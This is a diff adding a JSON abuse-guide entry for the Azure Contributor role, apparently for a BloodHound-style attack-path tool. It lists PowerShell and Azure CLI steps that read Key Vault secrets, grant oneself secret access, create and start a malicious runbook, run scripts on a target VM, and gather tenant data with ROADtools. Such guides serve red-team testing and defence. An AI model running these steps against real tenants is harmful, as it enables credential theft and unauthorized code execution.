@@ -1,0 +1,114 @@
+{
+    "AZContributor": {
+        "meaning": "The contributor role grants almost all abusable privileges in all circumstances, with some exceptions. Those exceptions are not collected by AzureHound.",
+        "common": "",
+        "windows": {
+            "KeyVault_PowerShell": [
+                {
+                    "order": 1,
+                    "command": "Connect-AzAccount",
+                    "description": "Connect to Azure account"
+                },
+                {
+                    "order": 2,
+                    "command": "Get-AzKeyVaultSecret -VaultName 'KeyVaultName' -Name 'SecretName' -AsPlainText",
+                    "description": "Read secrets from Key Vault"
+                },
+                {
+                    "order": 3,
+                    "command": "Set-AzKeyVaultAccessPolicy -VaultName 'KeyVaultName' -UserPrincipalName 'user@domain.com' -PermissionsToSecrets get,list,set",
+                    "description": "Grant yourself access to Key Vault secrets"
+                }
+            ],
+            "AutomationAccount_PowerShell": [
+                {
+                    "order": 1,
+                    "command": "Connect-AzAccount",
+                    "description": "Connect to Azure account"
+                },
+                {
+                    "order": 2,
+                    "command": "Import-AzAutomationRunbook -AutomationAccountName 'AutomationAccount' -ResourceGroupName 'RG' -Path 'C:\\malicious-runbook.ps1' -Type PowerShell",
+                    "description": "Create malicious runbook in Automation Account"
+                },
+                {
+                    "order": 3,
+                    "command": "Start-AzAutomationRunbook -AutomationAccountName 'AutomationAccount' -ResourceGroupName 'RG' -Name 'malicious-runbook'",
+                    "description": "Execute runbook as Automation Account"
+                }
+            ],
+            "VM_PowerShell": [
+                {
+                    "order": 1,
+                    "command": "Connect-AzAccount",
+                    "description": "Connect to Azure account"
+                },
+                {
+                    "order": 2,
+                    "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG' -VMName 'TargetVM' -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\malicious-script.ps1'",
+                    "description": "Execute commands on target VM with SYSTEM privileges"
+                }
+            ]
+        },
+        "linux": {
+            "KeyVault_AzureCLI": [
+                {
+                    "order": 1,
+                    "command": "az login",
+                    "description": "Login to Azure account"
+                },
+                {
+                    "order": 2,
+                    "command": "az keyvault secret show --vault-name 'KeyVaultName' --name 'SecretName' --query value -o tsv",
+                    "description": "Read secrets from Key Vault"
+                },
+                {
+                    "order": 3,
+                    "command": "az keyvault set-policy --name 'KeyVaultName' --upn 'user@domain.com' --secret-permissions get list set",
+                    "description": "Grant access to Key Vault secrets"
+                }
+            ],
+            "AutomationAccount_AzureCLI": [
+                {
+                    "order": 1,
+                    "command": "az login",
+                    "description": "Login to Azure account"
+                },
+                {
+                    "order": 2,
+                    "command": "az automation runbook create --automation-account-name 'AutomationAccount' --resource-group 'RG' --name 'malicious-runbook' --type 'PowerShell' --content '@malicious-script.ps1'",
+                    "description": "Create malicious runbook"
+                },
+                {
+                    "order": 3,
+                    "command": "az automation runbook start --automation-account-name 'AutomationAccount' --resource-group 'RG' --name 'malicious-runbook'",
+                    "description": "Execute runbook as Automation Account"
+                }
+            ],
+            "VM_AzureCLI": [
+                {
+                    "order": 1,
+                    "command": "az login",
+                    "description": "Login to Azure account"
+                },
+                {
+                    "order": 2,
+                    "command": "az vm run-command invoke --resource-group 'RG' --name 'TargetVM' --command-id RunShellScript --scripts 'whoami && id'",
+                    "description": "Execute commands on target VM"
+                }
+            ],
+            "ROADtools": [
+                {
+                    "order": 1,
+                    "command": "roadrecon auth -u user@domain.com -p password",
+                    "description": "Authenticate with ROADtools"
+                },
+                {
+                    "order": 2,
+                    "command": "roadrecon gather --mfa",
+                    "description": "Gather Azure information including Contributor privileges"
+                }
+            ]
+        }
+    }
+}
